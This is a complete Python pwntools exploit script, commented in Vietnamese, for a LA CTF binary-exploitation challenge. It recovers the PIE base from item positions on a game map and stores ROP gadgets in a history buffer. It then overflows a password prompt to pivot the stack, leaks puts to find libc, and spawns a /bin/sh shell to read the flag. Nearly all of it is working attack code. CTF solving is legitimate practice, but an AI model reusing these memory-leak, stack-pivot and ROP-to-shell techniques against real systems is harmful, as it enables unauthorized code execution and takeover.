#!/usr/bin/python3
from pwn import *
import time

# --- Cấu hình ---
context.binary = exe = ELF("./chall_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.arch = "amd64"

def check_history_payload(payload):
    if b'\n' in payload:
        return False
    if b'\x00' in payload:
        return False
    return True

def check_password_payload(payload):
    if b'\n' in payload:
        return False
    return True

def solve():
    p = None
    try:
        # p = process(exe.path)
        p = remote("chall.lac.tf", 31337)

        # --- Helper Functions ---
        def ru(msg): return p.recvuntil(msg, timeout=5)
        
        def sl(cmd):
            """Gửi lệnh và đợi prompt '>'"""
            p.sendline(cmd.encode() if isinstance(cmd, str) else cmd)
            return ru(b'> ')

        def s_gadget(payload):
            """Gửi gadget 7 bytes vào history"""
            # Kiểm tra dữ liệu trước khi gửi
            if not check_history_payload(payload):
                raise ValueError(f"Bad bytes in gadget: {payload}")
            
            p.send(payload)
            return ru(b'> ')

        # --- BƯỚC 1: Quét bản đồ ---
        ru(b'> ')
        output = sl("look")

        item_names = [b"Sword", b"Shield", b"Potion", b"Key", b"Scroll", b"Amulet", b"Crown", b"Flag"]
        found_positions = {}
        cur_x, cur_y = 0, 0

        # Check tại chỗ
        for idx, name in enumerate(item_names):
            if name in output: found_positions[idx] = (0, 0)

        # Đi tuần tự (Serpentine)
        for y in range(16):
            direction = "e" if y % 2 == 0 else "w"
            for _ in range(15):
                cur_x += 1 if direction == "e" else -1
                output = sl(direction)
                if b"You spot a" in output:
                    for idx, name in enumerate(item_names):
                        if name in output and idx not in found_positions:
                            found_positions[idx] = (cur_x, cur_y)
            if len(found_positions) == 8: break # Đủ đồ thì dừng tìm
            if y < 15:
                cur_y += 1
                output = sl("s")
                if b"You spot a" in output:
                    for idx, name in enumerate(item_names):
                        if name in output and idx not in found_positions:
                            found_positions[idx] = (cur_x, cur_y)

        # --- BƯỚC 2: Khôi phục địa chỉ PIE ---
        def recover_main_addr(positions):
            sim_board = [[0]*16 for _ in range(16)]
            recovered = [0]*8
            for i in range(7, -1, -1):
                if i not in positions: return 0
                tx, ty = positions[i]
                found = False
                for val in range(256):
                    v4, v3 = (val >> 4) & 0xF, val & 0xF
                    cv4, cv3 = v4, v3
                    while sim_board[cv3][cv4] != 0:
                        cv4 = (cv4 + 1) % 16
                        if cv4 == 0: cv3 = (cv3 + 1) % 16
                    if cv4 == tx and cv3 == ty:
                        recovered[i] = val
                        sim_board[cv3][cv4] = i + 1
                        found = True
                        break
                if not found: return 0
            return u64(bytes(recovered))

        addr = recover_main_addr(found_positions)
        if addr == 0: raise ValueError("Failed to recover PIE")

        exe.address = addr - exe.sym.main
        success(f"PIE Base: {hex(exe.address)}")

        # Kiểm tra xem các địa chỉ quan trọng có chứa Bad Byte ngay từ đầu không
        # Nếu có thì restart luôn đỡ mất công chạy
        if not check_history_payload(p64(exe.sym.main)[:-1]):
            raise ValueError("PIE address contains bad bytes for history")

        # --- BƯỚC 3: Xây dựng ROP Chain trong History ---
        leave_ret = exe.address + 0x14b7
        pop_rbp = exe.address + 0x1233
        
        # Đi thêm bước để đẩy history cũ đi
        for _ in range(15): sl("n")

        # Chain 1: Leak Libc
        # Lưu ý: p64(addr)[:-1] lấy 7 bytes. fgets sẽ tự điền byte thứ 8 là null.
        # Điều này tạo thành 1 địa chỉ 8-byte hoàn chỉnh (vì byte cao nhất của addr thường là 00)
        gadgets = [
            p64(pop_rbp)[:-1],
            p64(exe.address + 0x4020 + 0x10)[:-1], # last_item + 0x10
            p64(exe.sym.check_flag_password + 152)[:-1],
            p64(pop_rbp)[:-1],
            p64(exe.address + 0x4a20 + 0x8)[:-1],  # board + 0x8
            p64(exe.sym.check_flag_password + 152)[:-1],
            p64(pop_rbp)[:-1],
            p64(exe.address + 0x4500 + 0x1010)[:-1], # bss location
            p64(exe.sym.print_inventory)[:-1],
            p64(pop_rbp)[:-1],
            p64(exe.address + 0x4500 + 0x1520)[:-1], # bss location
            p64(exe.sym.main + 72)[:-1]
        ]

        for g in gadgets:
            s_gadget(g) # Hàm này đã bao gồm check_history_payload

        # --- BƯỚC 4: Trigger Overflow & Leak ---
        sl("grab")
        ru(b'Password: ')
        
        pivot_addr = exe.address + 0x4910 # ROP location in history
        
        # Payload: Padding (16) + Fake RBP (8) + Leave_Ret (7 bytes + 1 null từ fgets)
        # Check payload này xem có newline không
        payload_1 = b'A' * 0x10 + p64(pivot_addr) + p64(leave_ret)[:-1]
        if not check_password_payload(payload_1):
            raise ValueError("Payload 1 contains newline")
        p.send(payload_1)
        
        # Gửi payload leak (để print_inventory in ra puts GOT)
        payload_leak_1 = p64(exe.address + 0x3f98) + p64(0) + p64(pivot_addr + 0x18) + p64(leave_ret)[:-1]
        if not check_password_payload(payload_leak_1): raise ValueError("Leak payload 1 bad bytes")
        p.send(payload_leak_1)

        payload_leak_2 = p64(0) + p64(8) + p64(pivot_addr + 0x30) + p64(leave_ret)[:-1]
        if not check_password_payload(payload_leak_2): raise ValueError("Leak payload 2 bad bytes")
        p.send(payload_leak_2)
        
        ru(b'/300 ')
        leak = p.recvn(6)
        libc.address = u64(leak + b'\x00\x00') - libc.sym.puts
        success(f"Libc Base: {hex(libc.address)}")

        # --- BƯỚC 5: System Shell ---
        ru(b'> ')
        
        pop_rdi = libc.address + 0x10f78b
        binsh = next(libc.search(b"/bin/sh"))
        system = libc.sym.system
        ret = exe.address + 0x101a # Gadget RET để căn chỉnh stack 16-byte

        # Gửi chuỗi ROP cuối
        final_gadgets = [
            p64(ret)[:-1], # Align stack
            p64(pop_rdi)[:-1],
            p64(binsh)[:-1],
            p64(system)[:-1]
        ]

        for g in final_gadgets:
            s_gadget(g)

        sl("grab")
        ru(b'Password: ')
        
        # Offset cũ + 0x10 + 0x58
        # +8 bytes vì ta đã thêm gadget RET ở trên
        final_payload = b'A' * 0x10 + p64(pivot_addr + 0x58 + 0x10) + p64(leave_ret)[:-1]
        
        if not check_password_payload(final_payload):
            raise ValueError("Final payload contains newline")
        p.send(final_payload)

        # --- BƯỚC 6: Lấy Flag ---
        # Đợi 1 chút cho shell load
        time.sleep(1)
        p.sendline(b"cat flag.txt")
        
        # Dùng recvuntil '}' để bắt flag chính xác hơn recvall
        flag_data = p.recvuntil(b'}', timeout=3)
        if b"lactf{" in flag_data:
            print("\n" + "="*40)
            print(flag_data[flag_data.find(b'lactf'):].decode())
            print("="*40 + "\n")
            p.interactive() # Trao quyền điều khiển lại cho người dùng
            return True
        
        p.close()
        return False

    except ValueError as e:
        log.warning(f"Bad ASLR/Payload: {e}. Retrying...")
        if p: p.close()
        return False
    except Exception as e:
        log.warning(f"Error: {e}. Retrying...")
        if p: p.close()
        return False

if __name__ == "__main__":
    attempt = 1
    while True:
        log.info(f"--- Attempt {attempt} ---")
        if solve():
            break
        attempt += 1
        time.sleep(0.5)